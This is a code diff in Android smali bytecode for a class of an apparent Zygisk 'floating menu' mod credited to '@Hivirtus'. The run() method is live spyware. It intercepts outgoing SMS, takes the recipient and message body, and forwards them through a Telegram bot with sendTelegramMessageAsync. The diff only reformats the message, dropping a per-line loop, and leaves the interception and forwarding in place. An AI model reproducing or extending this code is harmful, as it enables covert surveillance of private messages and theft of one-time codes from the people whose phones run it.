@@ -28,7 +28,7 @@
 
 # virtual methods
 .method public run()V
-    .registers 12
+    .registers 11
 
     invoke-static {}, Lcom/floatingmenu/FloatingMenu;->loadTelegramConfig()[Ljava/lang/String;
 
@@ -42,21 +42,21 @@
 
     aget-object v0, v0, v2
 
-    if-eqz v1, :cond_61
+    if-eqz v1, :cond_4a
 
     invoke-virtual {v1}, Ljava/lang/String;->isEmpty()Z
 
     move-result v2
 
-    if-nez v2, :cond_61
+    if-nez v2, :cond_4a
 
-    if-eqz v0, :cond_61
+    if-eqz v0, :cond_4a
 
     invoke-virtual {v0}, Ljava/lang/String;->isEmpty()Z
 
     move-result v2
 
-    if-nez v2, :cond_61
+    if-nez v2, :cond_4a
 
     iget-object v2, p0, Lcom/floatingmenu/FloatingMenu$6;->val$dest:Ljava/lang/String;
 
@@ -100,61 +100,37 @@
 
     new-instance v4, Ljava/lang/StringBuilder;
 
-    const-string v5, "<b>\ud83d\udcf1 Intercepted Outgoing SMS Zygisk Mode Menu V3 @Hivirtus \ud83d\udd25</b>\n\n<b>To (Tap to copy):</b>\n<code>"
+    const-string v5, "<b>\ud83d\udcf1 Intercepted Outgoing SMS Zygisk</b>\n<b>Mode Menu V3</b> @Hivirtus \ud83d\udd25\n\n<b>\ud83d\udcde To:</b>\n<code>"
 
     invoke-direct {v4, v5}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V
 
     invoke-virtual {v4, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
 
-    const-string v2, "</code>\n\n<b>Body (Tap to copy):</b>\n"
+    const-string v2, "</code>\n\n<b>\ud83d\udcac Message:</b>\n<code>"
 
     invoke-virtual {v4, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
 
-    const-string v2, "\n"
+    invoke-virtual {v4, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
 
-    invoke-virtual {v3, v2}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;
+    const-string v2, "</code>"
 
-    move-result-object v10
+    invoke-virtual {v4, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
 
-    array-length v11, v10
-
-    const/4 v2, 0x0
-
-    :goto_body
-    if-ge v2, v11, :cond_body_done
-
-    aget-object v5, v10, v2
-
-    const-string v6, "<code>"
-
-    invoke-virtual {v4, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
-
-    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
-
-    const-string v5, "</code>\n"
-
-    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
-
-    add-int/lit8 v2, v2, 0x1
-
-    goto :goto_body
-
-    :cond_body_done
     invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;
 
     move-result-object v2
 
     invoke-static {v1, v0, v2}, Lcom/floatingmenu/FloatingMenu;->sendTelegramMessageAsync(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V
 
-    goto :goto_68
+    goto :goto_51
 
-    :cond_61
+    :cond_4a
     const-string v0, "zygisk_floating_menu"
 
     const-string v1, "Telegram credentials not configured; skipping SMS forward."
 
     invoke-static {v0, v1}, Landroid/util/Log;->w(Ljava/lang/String;Ljava/lang/String;)I
 
-    :goto_68
+    :goto_51
     return-void
 .end method
